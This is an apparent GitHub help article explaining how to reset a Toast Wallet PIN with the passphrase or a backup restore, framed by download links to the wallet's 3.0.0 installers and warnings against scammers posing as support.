<p align="center"><img src="https://github.com/Toast-Wallet/learn/raw/HEAD/assets/banner-article.png" alt="Toast Wallet banner" width="100%"></p>

<h1 align="center">Reset your Toast Wallet PIN</h1>

<p align="center">Use Reset PIN with your passphrase, then choose a new PIN.</p>

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

All versions and checksums are on the [Toast Wallet 3.0.0 release page](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).

> [!IMPORTANT]
> Only download from this GitHub release page.

---

## 💡 Short answer

On the PIN screen of the [latest Toast Wallet](https://github.com/Toast-Wallet/core/releases/tag/3.0.0), choose Reset PIN and enter your passphrase. Pick a new PIN, then make a fresh backup. If the passphrase does not work, restore your backup code instead and set the PIN again afterwards.

## 👀 You'll see this if

- You forgot the PIN that unlocks Toast Wallet.
- You typed the wrong PIN several times and are unsure what to do.
- Someone else may have seen your PIN and you want to change it.
- You restored a backup and want a different PIN on this computer.

## 🤔 Why it matters

The PIN is the everyday lock on Toast Wallet. It keeps casual visitors out of the app on your computer. It is deliberately short and convenient, which is why the stronger passphrase stands behind it. Because the passphrase is the real protection, Toast Wallet lets you use it to set a new PIN.

Users sometimes panic when the PIN is forgotten, assuming the XRP is lost. It is not. As long as you have your passphrase, or your backup code with the six recovery words, you can get back in.

## 🧭 Before you start

Have your passphrase written down in front of you. If you are not sure you remember it, also gather your backup code and six recovery words, so you can switch to the restore route without stopping halfway.

## 🛠️ Fix: reset the PIN step by step

1. **Make sure you have the latest desktop wallet.** If you run an old build, note your account addresses, remove the old version and install the current release. See [update Toast Wallet to the latest version](https://github.com/Toast-Wallet/learn/blob/main/how-to/update-toast-wallet-to-latest-version.md).
2. **Open Toast Wallet.** The PIN screen appears.
3. **Choose Reset PIN.** It is offered on the PIN screen.
4. **Enter your passphrase.** Type it slowly and check the keyboard layout.
5. **Choose a new PIN.** Avoid birthdays, repeated digits and simple sequences.
6. **Unlock and check.** Confirm your accounts and addresses look as expected.
7. **Change the PIN later if needed.** Once inside, Settings offers Change PIN for future changes.
8. **Make a new backup.** In Settings choose Backup Wallet. A fresh backup after any security change is a good habit; see [create a new Toast Wallet backup](https://github.com/Toast-Wallet/learn/blob/main/how-to/create-new-toast-wallet-backup.md).

## ⚠️ Common mistakes

- Entering the PIN of a different app or device out of habit, then assuming the wallet is broken.
- Typing the passphrase on a keyboard layout different from the one it was created on.
- Uninstalling the wallet in frustration before trying Reset PIN, which only adds work.
- Choosing a new PIN that matches a phone or bank PIN, which weakens both.
- Sharing the screen with a "helper" while resetting; the PIN screen is a private moment.

## 🔁 If that did not work

- **The passphrase is refused.** Work through [Toast Wallet passphrase not working](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-passphrase-not-working.md).
- **You forgot the passphrase too.** Restore your backup with the six recovery words, as in [Toast Wallet forgot passphrase](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-forgot-passphrase.md). You will set a new PIN during the restore.
- **There is no Reset PIN option.** You are probably on an outdated version. Install the latest release.
- **The app talks about two-step codes.** Toast Wallet does not use SMS or app-based codes. Any message asking for a code sent to your phone is not from Toast Wallet.

## 🛡️ Prevention

Choose a PIN you will remember but nobody can guess. Keep your passphrase written down safely, because it is the key to resetting the PIN. Lock the screen when you leave your computer and close Toast Wallet when you are not using it.

## 📝 Good to know

The PIN only protects the app on this computer. It is not part of your backup in the way the passphrase and six words are, and it does not travel with your XRP. That is why a new PIN on a new computer is completely normal: you choose it during a restore, and it can be different from the PIN you used before. If you use Toast Wallet on more than one computer, each copy can have its own PIN, but the passphrase that protects sending is what really matters.

## 🔍 A closer look at PIN versus passphrase

It is easy to blur the PIN and the passphrase together, so it is worth restating the difference. The PIN is the short code that opens the app on this computer each day. It is convenient by design. The passphrase is the longer secret that protects sending XRP and restoring backups. Reset PIN works because the stronger secret, the passphrase, proves that you are the owner.

That also means the passphrase is the real protection if someone learns your PIN. They might open the app and look at your balance, but they cannot send XRP without the passphrase. Changing the PIN after a suspected leak is still wise, and so is making sure your passphrase is long and private.

Think of it in everyday terms: the PIN is like the lock on your front door, while the passphrase is the combination to the safe inside. Losing the door key is annoying but fixable with the combination. That is exactly what Reset PIN does.

## ❓ FAQ

<details>
<summary>Do I lose my XRP if I forget the PIN?</summary>

No. Reset it with your passphrase, or restore your backup code.

</details>

<details>
<summary>Is the PIN stored online?</summary>

No. The PIN protects the app on your computer only.

</details>

<details>
<summary>Can support reset my PIN?</summary>

No. Only you can, using your passphrase. Ignore anyone offering to do it for you.

</details>

> [!WARNING]
> Never give your passphrase to anyone who offers to reset your PIN. Reset PIN happens only inside the desktop app.

---

## ⬇️ Download Toast Wallet 3.0.0

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

Checksums for every file are on the [official Toast Wallet 3.0.0 release](https://github.com/Toast-Wallet/core/releases/tag/3.0.0). More guides live in the [Toast Wallet learn hub](https://github.com/Toast-Wallet/learn).

---

## 📚 Related articles

| Guide | What it covers |
|:--|:--|
| [Toast Wallet forgot passphrase](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-forgot-passphrase.md) | Options when you no longer remember the passphrase. |
| [Toast Wallet passphrase not working](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-passphrase-not-working.md) | Common typing and backup-age reasons a passphrase is refused. |
| [Create a new Toast Wallet backup](https://github.com/Toast-Wallet/learn/blob/main/how-to/create-new-toast-wallet-backup.md) | Make a fresh backup code after any change to your accounts. |
